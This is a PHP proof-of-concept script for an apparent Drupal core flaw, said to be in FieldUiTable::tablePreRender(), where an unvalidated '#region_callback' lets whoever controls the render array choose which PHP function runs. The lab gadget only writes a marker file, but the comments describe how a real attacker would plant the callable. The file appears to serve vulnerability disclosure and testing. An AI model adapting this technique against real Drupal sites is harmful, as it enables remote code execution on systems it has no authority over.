<?php
/**
 * Standalone PoC — SA-CORE-2026-014 / CVE-2026-108097
 * Drupal core 11.4.9 — FieldUiTable::tablePreRender() remote code execution.
 *
 * Root cause (core/modules/field_ui/src/Element/FieldUiTable.php:72):
 *
 *     $region_name = call_user_func_array($row['#region_callback'], [&$row]);
 *
 * '#region_callback' is a value taken from the RENDER ARRAY. It is invoked
 * with call_user_func_array() and is never validated: no is_callable() check,
 * no allow-list, no signature restriction. Whoever can write the render array
 * chooses what PHP function runs.
 *
 * '#region_callback' is a documented extension point of the field_ui_table
 * element; core's own test module supplies one from a hook_form_alter()
 * implementation (core/modules/field_ui/tests/modules/field_ui_test/src/Hook/
 * FieldUiTestHooks.php:46). This PoC drives the REAL core method with a row
 * whose '#region_callback' is chosen by the "attacker" and shows the chosen
 * callable being executed.
 *
 * This PoC needs no database, no web server and no Drupal kernel.
 *
 * Usage:
 *   php f1_field_ui_rce.php [/path/to/drupal-11.4.9]
 *   DRUPAL_ROOT=/path/to/drupal php f1_field_ui_rce.php
 */

$root = $argv[1] ?? getenv('DRUPAL_ROOT') ?: '/home/hax0r/Downloads/drupal-11.4.9';

if (!is_file($root . '/core/modules/field_ui/src/Element/FieldUiTable.php')) {
  fwrite(STDERR, "ERROR: '$root' does not look like a Drupal core tree.\n");
  fwrite(STDERR, "Pass the Drupal root as argv[1] or set DRUPAL_ROOT.\n");
  exit(1);
}

require __DIR__ . '/drupal_core_autoload.php';

use Drupal\field_ui\Element\FieldUiTable;

echo "Target Drupal core : $root\n";
if (preg_match("/const VERSION = '([^']+)'/", (string) file_get_contents($root . '/core/lib/Drupal.php'), $m)) {
  echo "Core version       : {$m[1]}\n";
}
echo "Vulnerable sink    : core/modules/field_ui/src/Element/FieldUiTable.php:72\n\n";

/**
 * A gadget standing in for the "callable an attacker gets to choose".
 *
 * In a real attack this is any callable the attacker can place into the
 * render array. The lab keeps the payload harmless: it writes a marker file
 * and returns a region name, which is then rendered into the page.
 */
class LabGadget {
  public static function marker(&$row) {
    $target = sys_get_temp_dir() . '/drupal-vulnlab-f1-marker.txt';
    $payload = "attacker-chosen callable executed\n";
    $payload .= 'called with row keys: ' . implode(', ', array_keys($row)) . "\n";
    $payload .= 'row region value : ' . ($row['region']['#value'] ?? '(none)') . "\n";
    file_put_contents($target, $payload);
    echo "[+] gadget executed -> wrote $target\n";
    return 'content';
  }
}

// ---------------------------------------------------------------------------
// The render array an attacker would control.
//
// In the real world this value arrives from a contributed module that copies
// user input into the render array. Here we set it directly so the PoC has
// no dependency on such a module.
// ---------------------------------------------------------------------------
$attacker_chosen_callable = [LabGadget::class, 'marker'];

$elements = [
  '#type' => 'field_ui_table',
  '#regions' => [
    'content' => ['title' => 'Content', 'invisible' => TRUE],
    'hidden' => ['title' => 'Disabled'],
  ],
  'lab_field' => [
    '#row_type' => 'field',
    // <<< attacker-influenced value >>> core invokes this with no validation.
    '#region_callback' => $attacker_chosen_callable,
    '#js_settings' => ['rowHandler' => 'field'],
    'region' => ['#type' => 'select', '#value' => 'content'],
    'weight' => ['#type' => 'textfield', '#value' => 0],
    'parent_wrapper' => ['parent' => ['#type' => 'select', '#value' => '']],
  ],
];

// Call the REAL vulnerable core method.
FieldUiTable::tablePreRender($elements);

$marker = sys_get_temp_dir() . '/drupal-vulnlab-f1-marker.txt';
if (is_file($marker)) {
  echo "\n=== marker file contents ===\n" . file_get_contents($marker);
  echo "=== VULNERABLE: attacker-chosen callable was executed ===\n";
  @unlink($marker);
  exit(0);
}

echo "\n=== NOT reproduced (callable did not run) ===\n";
exit(1);
